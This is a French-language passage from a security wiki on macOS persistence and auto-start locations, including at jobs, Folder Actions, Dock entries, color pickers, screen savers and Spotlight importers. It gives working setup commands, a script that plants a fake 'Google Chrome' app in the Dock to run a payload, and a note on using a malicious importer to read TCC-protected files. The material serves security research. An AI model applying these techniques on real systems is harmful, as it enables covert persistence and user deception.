  - Mais vous devez **exécuter** **`at`**, et il doit être **activé**
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- Vous devez **exécuter** **`at`**, et il doit être **activé**

#### **Description**

Les tâches `at` sont conçues pour **planifier des tâches ponctuelles** à exécuter à des heures précises. Contrairement aux tâches cron, les tâches `at` sont automatiquement supprimées après leur exécution. Il est important de noter que ces tâches persistent après les redémarrages du système, ce qui peut poser des problèmes de sécurité dans certaines conditions.<sup>[[16]](#references)</sup>

Le fichier `com.apple.atrun.plist` fourni avec le système contient `Disabled = true`, mais launchd conserve séparément les dérogations effectives d’activation ou de désactivation. Sur la machine de test sous macOS 26.5.2, `launchctl print-disabled system` indiquait que `com.apple.atrun` était **activé**, malgré cette clé du fichier fourni. Vérifiez l’état effectif avant d’affirmer que les tâches `at` s’exécuteront :

```bash
launchctl print-disabled system | grep 'com.apple.atrun'
launchctl print system/com.apple.atrun
```

Un administrateur peut activer un service `atrun` désactivé avec `launchctl` ; l’exemple historique suivant modifie l’état d’un service système et **n’a pas été exécuté** sur le Mac de recherche :

```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```

Cela créera un fichier dans 1 heure :

```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```

Vérifiez la file d’attente des tâches à l’aide de `atq:`

```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```

Ci-dessus, nous pouvons voir deux tâches planifiées. Nous pouvons afficher les détails d’une tâche à l’aide de `at -c JOBNUMBER`

```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
	 echo 'Execution directory inaccessible' >&2
	 exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```

> [!WARNING]
> Si les tâches AT ne sont pas activées, les tâches créées ne seront pas exécutées.

Les **fichiers de tâches** se trouvent dans `/private/var/at/jobs/`

```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```

Le nom du fichier contient la file d’attente, le numéro de tâche et l’heure à laquelle elle doit s’exécuter. Prenons par exemple `a0001a019bdcd2`.

- `a` - il s’agit de la file d’attente
- `0001a` - numéro de tâche en hexadécimal, `0x1a = 26`
- `019bdcd2` - heure en hexadécimal. Elle représente le nombre de minutes écoulées depuis l’époque Unix. `0x019bdcd2` vaut `26991826` en décimal. En multipliant ce nombre par 60, on obtient `1619509560`, soit `GMT : mardi 27 avril 2021 à 7:46:00`.

Si nous affichons le fichier de tâche, nous constatons qu’il contient les mêmes informations que celles obtenues avec `at -c`.

### Alertes d’ouverture de fichier dans Calendar

- **Cible d’écriture :** une app bundle exécutable ou un autre fichier **déjà sélectionné** par une alerte personnalisée **Ouvrir un fichier** d’un événement Calendar. La création ou la modification de l’alerte nécessite l’accès à l’événement via Calendar ou une source de données de calendrier autorisée ; une écriture aléatoire dans un fichier ne crée pas d’alerte.
- **Déclenchement :** à l’heure prévue de l’alerte, sur un Mac où Calendar traite l’événement. Un événement récurrent peut répéter l’action. [Le guide actuel d’Apple sur Calendar](https://support.apple.com/guide/calendar/icl1012/mac) confirme l’option d’alerte **Personnalisée → Ouvrir un fichier** sous macOS 26.
- **Identité d’exécution et contrôles :** Calendar ouvre le fichier choisi pour l’utilisateur connecté, à l’aide de l’application associée. L’ouverture d’une app bundle peut exécuter son code en tant que cet utilisateur, sous réserve de Gatekeeper, de la quarantaine et des autres contrôles macOS. Un simple fichier de script peut uniquement s’ouvrir dans un éditeur ; son extension ne prouve pas à elle seule que le code sera exécuté.

Pour évaluer une cible potentielle sans risque, inspectez l’alerte de l’événement dans Calendar et les permissions du fichier sélectionné. Cette méthode est documentée dans le guide d’Apple et **n’a pas été testée** sur le Mac de recherche, car cela aurait modifié un calendrier actif et nécessité d’attendre un événement du bureau. Dans un compte jetable, on peut sélectionner une app bundle ne faisant que créer un marqueur, programmer une alerte Ouvrir un fichier à une heure proche, confirmer le lancement, puis supprimer l’événement et l’app.

### Automatisations Shortcuts sous macOS

- **Cible d’écriture :** un fichier exécutable **déjà référencé** par l’action d’un raccourci, ou un raccourci existant qu’un utilisateur autorisé peut modifier. Un fichier `.shortcut` quelconque ou une écriture dans une base de données Shortcuts non documentée ne constitue pas une méthode prise en charge pour enregistrer une automatisation.
- **Déclencheur et identité :** un événement d’automatisation déjà configuré et activé, comme une heure de la journée ou un événement lié à une app, lance le raccourci pour l’utilisateur connecté. [Le guide actuel d’Apple sur les automatisations Mac](https://support.apple.com/guide/shortcuts-mac/add-automations-apdfbdbd7123/mac) répertorie les événements pris en charge, explique dans quels cas une automatisation peut s’exécuter sans demander de confirmation et décrit la suppression d’un déclencheur. [Le guide de confidentialité d’Apple pour Shortcuts](https://support.apple.com/guide/shortcuts-mac/apdfeb05586f/mac) exige l’option **Autoriser l’exécution de scripts** pour les actions de script ; certaines actions peuvent tout de même demander des permissions.

Il s’agit d’un chemin d’écriture vers l’exécution conditionnel, **uniquement lorsque l’action existante charge une cible modifiable**. La création d’une nouvelle automatisation via l’interface modifierait les réglages actifs ; cela n’a pas été tenté sur le Mac de recherche. Dans un compte jetable, un propriétaire peut configurer un raccourci à heure fixe dont le script crée `/tmp/ht-shortcuts-marker`, accorder les permissions nécessaires, vérifier la présence du marqueur après le déclenchement, puis supprimer l’automatisation, le raccourci et le marqueur.

### Actions Automator et Quick Actions

- **Cibles d’écriture :** `~/Library/Automator/*.action` (utilisateur) et `/Library/Automator/*.action` (administrateur) pour les bundles d’action. Un workflow Quick Action enregistré se trouve généralement dans `~/Library/Services/*.workflow` ; vérifiez le chemin réel du workflow choisi par l’utilisateur. [La référence du framework Automator d’Apple](https://developer.apple.com/documentation/automator) répertorie les répertoires où les actions sont recherchées.
- **Déclenchement :** Automator charge les bundles d’action disponibles lorsqu’il s’exécute, mais une action n’effectue sa tâche que lorsqu’un workflow qui l’utilise est lancé. Une Quick Action s’exécute lorsque l’utilisateur la sélectionne dans Finder, Services ou un autre menu disponible. Un workflow Folder Action s’exécute lorsque des éléments sont ajoutés à son dossier **déjà associé**, et un workflow Calendar Alarm s’exécute à l’heure de son événement. [Les types de workflow d’Apple](https://support.apple.com/guide/automator/aut7cac58839/mac) distinguent ces événements. Le simple fait d’écrire une action ou un workflow n’associe pas de dossier et ne programme pas d’événement de calendrier.
- **Identité d’exécution et contrôles :** le compte qui exécute le workflow ; Automator ou l’app qui l’invoque doit charger l’action, et les contrôles actuels de signature du code et de confidentialité doivent l’autoriser. Un bundle d’action modifiable déjà référencé par un workflow actif est différent de l’installation d’une nouvelle action en attendant qu’elle soit sélectionnée.

Les répertoires utilisateur `Automator` et `Services` étaient présents sur le Mac de test sous macOS 26.5.2 ; `/Library/Automator` était absent. Aucun workflow actif n’a été créé, associé ou exécuté. Utilisez un compte jetable et une action ou un workflow ne faisant que créer un marqueur pour confirmer un chemin de chargement particulier. La section distincte [Folder Actions](#folder-actions) décrit plus en détail cette source d’événement.

### Folder Actions

Article : [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Article : [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais il faut pouvoir appeler `osascript` avec des arguments pour contacter **`System Events`** et configurer Folder Actions
- Contournement TCC : [🟠](https://emojipedia.org/large-orange-circle)
  - Elle dispose de certaines permissions TCC de base, notamment pour Desktop, Documents et Downloads

#### Emplacement

- **`/Library/Scripts/Folder Action Scripts`**
  - Droits root requis
  - **Déclencheur** : accès au dossier spécifié
- **`~/Library/Scripts/Folder Action Scripts`**
  - **Déclencheur** : accès au dossier spécifié

#### Description et exploitation

Folder Actions sont des scripts déclenchés automatiquement par les changements dans un dossier, comme l’ajout ou la suppression d’éléments, ou d’autres actions telles que l’ouverture ou le redimensionnement de la fenêtre du dossier. Ces actions peuvent servir à différentes tâches et être déclenchées de diverses manières, par exemple depuis l’interface de Finder ou à l’aide de commandes du terminal.<sup>[[17]](#references)[[18]](#references)</sup>

Pour configurer Folder Actions, plusieurs possibilités s’offrent à vous :

1. Créer un workflow Folder Action avec [Automator](https://support.apple.com/guide/automator/welcome/mac) et l’installer comme service.
2. Associer manuellement un script via la configuration de Folder Actions dans le menu contextuel d’un dossier.
3. Utiliser OSAScript pour envoyer des messages Apple Event à `System Events.app` afin de configurer Folder Action par programmation.
   - Cette méthode est particulièrement utile pour intégrer l’action au système et assurer ainsi un certain niveau de persistance.

Le script suivant est un exemple de ce qui peut être exécuté par une Folder Action :

```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Pour rendre le script ci-dessus utilisable par Folder Actions, compilez-le à l’aide de :

```bash
osacompile -l JavaScript -o folder.scpt source.js
```

Après la compilation du script, configurez les actions de dossier en exécutant le script ci-dessous. Ce script activera les actions de dossier à l’échelle globale et associera spécifiquement le script précédemment compilé au dossier Bureau.

```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```

Exécutez le script de configuration avec :

```bash
osascript -l JavaScript /Users/username/attach.scpt
```

- Voici comment implémenter cette persistance via l’interface graphique :

Voici le script qui sera exécuté :

```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```

Compilez-le avec : `osacompile -l JavaScript -o folder.scpt source.js`

Déplacez-le vers :

```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```

Ensuite, ouvrez l’application `Folder Actions Setup`, sélectionnez le **dossier que vous souhaitez surveiller**, puis sélectionnez dans votre cas **`folder.scpt`** (dans mon cas, je l’ai appelé output2.scp) :

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Maintenant, si vous ouvrez ce dossier avec **Finder**, votre script sera exécuté.

Cette configuration était stockée au format base64 dans le **plist** situé dans **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**.

Essayons maintenant de préparer cette persistence sans accès à l’interface graphique :

1. **Copiez `~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dans `/tmp` pour en faire une sauvegarde :
   - `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **Supprimez** les Folder Actions que vous venez de configurer :

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Maintenant que l’environnement est vide :

3. Copiez le fichier de sauvegarde : `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Ouvrez l’application Folder Actions Setup.app pour charger cette configuration : `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Et ça n’a pas fonctionné pour moi, mais voici les instructions du writeup :(

### Raccourcis du Dock

Writeup : [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- Utile pour contourner le sandbox : [✅](https://emojipedia.org/check-mark-button)
  - Mais vous devez avoir installé une application malveillante sur le système
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `~/Library/Preferences/com.apple.dock.plist`
  - **Déclencheur** : lorsque l’utilisateur clique sur l’application dans le Dock

#### Description et exploitation

Toutes les applications qui apparaissent dans le Dock sont spécifiées dans le plist : **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup>

Il est possible **d’ajouter une application** simplement avec :

```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```

En utilisant un peu de **social engineering**, vous pourriez **vous faire passer, par exemple, pour Google Chrome** dans le Dock et exécuter réellement votre propre script :

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```

### Méthodes de saisie

- **Cible d’écriture :** un bundle d’app de méthode de saisie contenant du code, installé dans `~/Library/Input Methods/` (utilisateur) ou `/Library/Input Methods/` (administrateur). Cela diffère des fichiers de mappage clavier `.inputplugin` en texte brut d’Apple, qui ne constituent pas à eux seuls une charge utile de code arbitraire.
- **Déclenchement :** l’utilisateur ajoute/active la source de saisie dans **Réglages Système → Clavier → Saisie de texte**, puis la sélectionne ou l’utilise. Le simple fait qu’un bundle soit copié dans le répertoire ne prouve pas que macOS le lancera. Le [guide actuel d’Apple sur les sources de saisie](https://support.apple.com/guide/mac-help/mchl84525d76/mac) décrit l’activation et le changement de source ; la [documentation InputMethodKit d’Apple](https://developer.apple.com/documentation/inputmethodkit) porte sur les méthodes de saisie contenant du code.
- **Identité d’exécution et contrôles :** la méthode s’exécute pour l’utilisateur connecté, sous réserve de l’enregistrement de la méthode de saisie, de la signature du code et des contrôles de sécurité actuels de macOS. Les méthodes déjà activées dont l’exécutable est modifiable nécessitent un examen distinct du chemin et de la signature.

La [ancienne note d’Apple sur les méthodes de saisie tierces](https://developer.apple.com/library/archive/qa/qa1810/_index.html) avertissait déjà que la copie de certaines méthodes de palette dans ces répertoires ne suffit même pas à les faire apparaître dans les Sources de saisie. Sur le Mac de recherche sous macOS 26.5.2, le répertoire utilisateur existe, mais aucun bundle n’était installé ni activé ; il s’agit donc d’un chemin conditionnel documenté, et non d’un résultat d’exécution local.

### Sélecteurs de couleurs

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Utile pour contourner la sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Une action très précise doit se produire
  - Vous vous retrouverez dans une autre sandbox
- TCC bypass : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/Library/ColorPickers`
  - Privilèges root requis
  - Déclenchement : utiliser le sélecteur de couleurs
- `~/Library/ColorPickers`
  - Déclenchement : utiliser le sélecteur de couleurs

#### Description et exploitation

**Compilez un bundle de sélecteur de couleurs** avec votre code (vous pouvez utiliser [**celui-ci, par exemple**](https://github.com/viktorstrate/color-picker-plus)) et ajoutez un constructeur (comme dans la section [Screen Saver](macos-auto-start-locations.md#screen-saver)), puis copiez le bundle dans `~/Library/ColorPickers`.<sup>[[20]](#references)</sup>

Ensuite, lorsque le sélecteur de couleurs est déclenché, votre bundle devrait également s’exécuter.

Cela dépend d’une app compatible qui ouvre le panneau de couleurs du système et sélectionne le sélecteur installé. Le [guide d’Apple sur le panneau de couleurs](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/DrawColor/Tasks/AddingColorPickers.html) décrit les emplacements historiques des bundles. Une vérification locale du chemin a trouvé le service XPC historique de sélecteur de couleurs, mais aucun sélecteur n’était installé ni chargé sur le Mac de recherche ; ne déduisez pas un TCC bypass du seul chemin.

Notez que le binaire qui charge votre bibliothèque a une **sandbox très restrictive** : `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

```bash
[Key] com.apple.security.temporary-exception.sbpl
	[Value]
		[Array]
			[String] (deny file-write* (home-subpath "/Library/Colors"))
			[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
			[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```

### Plugins Finder Sync

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- Utile pour contourner le sandbox : **Non, car vous devez exécuter votre propre application**
- Contournement de TCC : dépend du sandbox et des permissions de l’extension activée ; aucun contournement général n’a été établi.

#### Emplacement

- Une application spécifique

#### Description et exploitation

Un exemple d’application avec une Finder Sync Extension [**est disponible ici**](https://github.com/D00MFist/InSync).

Les applications peuvent avoir des `Finder Sync Extensions`. Cette extension se trouve dans une application qui sera exécutée. De plus, pour pouvoir exécuter son code, l’extension **doit être signée** avec un certificat de développeur Apple valide, elle doit être **sandboxée** (bien que des exceptions moins strictes puissent être ajoutées) et elle doit être enregistrée à l’aide d’une commande similaire à :<sup>[[21]](#references)[[22]](#references)</sup>

Une extension installée doit également être **activée** et invoquée pour un emplacement ou un élément Finder pertinent ; écrire un bundle `.appex` quelconque ne suffit pas. [L’API Finder Sync d’Apple](https://developer.apple.com/documentation/findersync/fifindersynccontroller/isextensionenabled) permet de vérifier l’état d’activation. Les commandes `pluginkit` ci-dessous illustrent l’enregistrement et l’activation explicites, et non un démarrage automatique déclenché par la seule présence d’un fichier. Cette méthode a fait l’objet d’une revue de la documentation ; aucune nouvelle extension n’a été installée ni activée sur le Mac de recherche.

```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```

### Économiseur d’écran

Compte rendu : [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Compte rendu : [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous vous retrouverez dans un sandbox d’application classique
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- `/System/Library/Screen Savers`
  - Droits root requis
  - **Déclencheur** : Sélectionner l’économiseur d’écran
- `/Library/Screen Savers`
  - Droits root requis
  - **Déclencheur** : Sélectionner l’économiseur d’écran
- `~/Library/Screen Savers`
  - **Déclencheur** : Sélectionner l’économiseur d’écran

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Description et exploitation

Créez un nouveau projet dans Xcode et sélectionnez le modèle permettant de générer un nouvel **économiseur d’écran**. Ajoutez-y ensuite votre code, par exemple le code suivant pour générer des journaux.<sup>[[23]](#references)[[24]](#references)</sup>

**Compilez** le projet, puis copiez le bundle `.saver` dans **`~/Library/Screen Savers`**. Ensuite, ouvrez l’interface graphique de l’économiseur d’écran et cliquez dessus : cela devrait générer beaucoup de journaux :

```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```

> [!CAUTION]
> Notez que, puisque vous pouvez trouver **`com.apple.security.app-sandbox`** dans les entitlements du binaire qui charge ce code (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`), vous vous trouverez dans le sandbox commun des applications.

Code de l’économiseur d’écran :

```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    self = [super initWithFrame:frame isPreview:isPreview];
    if (self) {
        [self setAnimationTimeInterval:1/30.0];
    }
    return self;
}

- (void)startAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super startAnimation];
}

- (void)stopAnimation
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    [super drawRect:rect];
}

- (void)animateOneFrame
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return;
}

- (BOOL)hasConfigureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return NO;
}

- (NSWindow*)configureSheet
{
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
    return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
    NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```

### Plug-ins Spotlight

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Mais vous vous retrouverez dans un sandbox d’application
- Contournement de TCC : [🔴](https://emojipedia.org/large-red-circle)
  - Le sandbox semble très limité

#### Emplacement

- `~/Library/Spotlight/`
  - **Déclencheur** : création d’un nouveau fichier dont l’extension est gérée par le plug-in Spotlight.
- `/Library/Spotlight/`
  - **Déclencheur** : création d’un nouveau fichier dont l’extension est gérée par le plug-in Spotlight.
  - Droits root requis
- `/System/Library/Spotlight/`
  - **Déclencheur** : création d’un nouveau fichier dont l’extension est gérée par le plug-in Spotlight.
  - Droits root requis
- `Some.app/Contents/Library/Spotlight/`
  - **Déclencheur** : création d’un nouveau fichier dont l’extension est gérée par le plug-in Spotlight.
  - Une nouvelle app est requise

#### Description et exploitation

Spotlight est la fonctionnalité de recherche intégrée de macOS, conçue pour offrir aux utilisateurs **un accès rapide et complet aux données stockées sur leurs ordinateurs**.\
Pour permettre cette recherche rapide, Spotlight gère une **base de données propriétaire** et crée un index en **analysant la plupart des fichiers**, ce qui permet d’effectuer rapidement des recherches sur les noms de fichiers et leur contenu.<sup>[[25]](#references)</sup>

Le mécanisme sous-jacent de Spotlight repose sur un processus central nommé « mds », qui signifie **« metadata server »**. Ce processus orchestre l’ensemble du service Spotlight. Il est complété par plusieurs daemons « mdworker » qui effectuent diverses tâches de maintenance, comme l’indexation de différents types de fichiers (`ps -ef | grep mdworker`). Ces tâches sont rendues possibles par les plug-ins d’importation Spotlight, ou **« bundles .mdimporter »**, qui permettent à Spotlight de comprendre et d’indexer le contenu de nombreux formats de fichiers.

Les plug-ins ou bundles **`.mdimporter`** se trouvent aux emplacements indiqués précédemment. Un nouveau bundle doit être détecté et correspondre à un type de fichier, et Spotlight doit réellement indexer un fichier correspondant ; la simple copie d’un bundle ne prouve pas qu’il a été chargé. [La référence MDImporter d’Apple](https://developer.apple.com/documentation/coreservices/file_metadata/mdimporter) indique que le chargement dépend de la modification d’un fichier admissible. L’exécution des importateurs Spotlight sur macOS 26 n’a pas été testée ici.

Il est possible de **trouver tous les `mdimporters`** chargés en exécutant :

```bash
mdimport -L
Paths: id(501) (
    "/System/Library/Spotlight/iWork.mdimporter",
    "/System/Library/Spotlight/iPhoto.mdimporter",
    "/System/Library/Spotlight/PDF.mdimporter",
    [...]
```

Et, par exemple, **/Library/Spotlight/iBooksAuthor.mdimporter** est utilisé pour analyser ce type de fichiers (extensions `.iba` et `.book`, entre autres) :

```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
    0 => {
      "CFBundleTypeName" => "iBooks Author Book"
      "CFBundleTypeRole" => "MDImporter"
      "LSItemContentTypes" => [
        0 => "com.apple.ibooksauthor.book"
        1 => "com.apple.ibooksauthor.pkgbook"
        2 => "com.apple.ibooksauthor.template"
        3 => "com.apple.ibooksauthor.pkgtemplate"
      ]
      "LSTypeIsPackage" => 0
    }
  ]
[...]
 => {
      "UTTypeConformsTo" => [
        0 => "public.data"
        1 => "public.composite-content"
      ]
      "UTTypeDescription" => "iBooks Author Book"
      "UTTypeIdentifier" => "com.apple.ibooksauthor.book"
      "UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
      "UTTypeTagSpecification" => {
        "public.filename-extension" => [
          0 => "iba"
          1 => "book"
        ]
      }
    }
[...]
```

> [!CAUTION]
> Si vous examinez le Plist d'autres `mdimporter`, vous ne trouverez peut-être pas l'entrée **`UTTypeConformsTo`**. En effet, il s'agit d'un _Identifiant de type uniforme_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) intégré, qui n'a pas besoin de spécifier d'extensions.
>
> De plus, les plugins par défaut du système sont toujours prioritaires : un attaquant ne peut donc accéder qu'aux fichiers qui ne sont pas déjà indexés par les `mdimporters` d'Apple.

Pour créer votre propre importer, vous pouvez partir de ce projet : [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer), puis changer le nom et **`CFBundleDocumentTypes`**, et ajouter **`UTImportedTypeDeclarations`** pour qu'il prenne en charge l'extension souhaitée et les refléter dans **`schema.xml`**.\
Modifiez ensuite le code de la fonction **`GetMetadataForFile`** pour exécuter votre payload lorsqu'un fichier portant l'extension prise en charge est créé.

Enfin, **compilez et copiez votre nouveau `.mdimporter`** dans l'un des trois emplacements précédents. Vous pouvez vérifier s'il est chargé en **surveillant les logs** ou en exécutant **`mdimport -L`**.

> [!TIP]
> Même si le sandbox de l'importer est très restrictif, `mdworker` indexe les fichiers avec un **accès en lecture privilégié**. Un `.mdimporter` malveillant peut donc lire le *contenu* des fichiers situés dans des emplacements protégés par TCC (Downloads, Pictures, Desktop, …) et exfiltrer les métadonnées collectées sans aucun message TCC — le **contournement TCC « Sploitlight » (CVE-2025-31199)**, corrigé dans macOS Sequoia 15.4.<sup>[[55]](#references)</sup>

### ~~Panneau de préférences~~

> [!CAUTION]
> Il semble que cela ne fonctionne plus.

Writeup : [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- Utile pour contourner le sandbox : [🟠](https://emojipedia.org/large-orange-circle)
  - Nécessite une action spécifique de l'utilisateur
- Contournement TCC : [🔴](https://emojipedia.org/large-red-circle)

#### Emplacement

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Il semble que cela ne fonctionne plus.<sup>[[26]](#references)</sup>

### Fichiers de scripts d’application

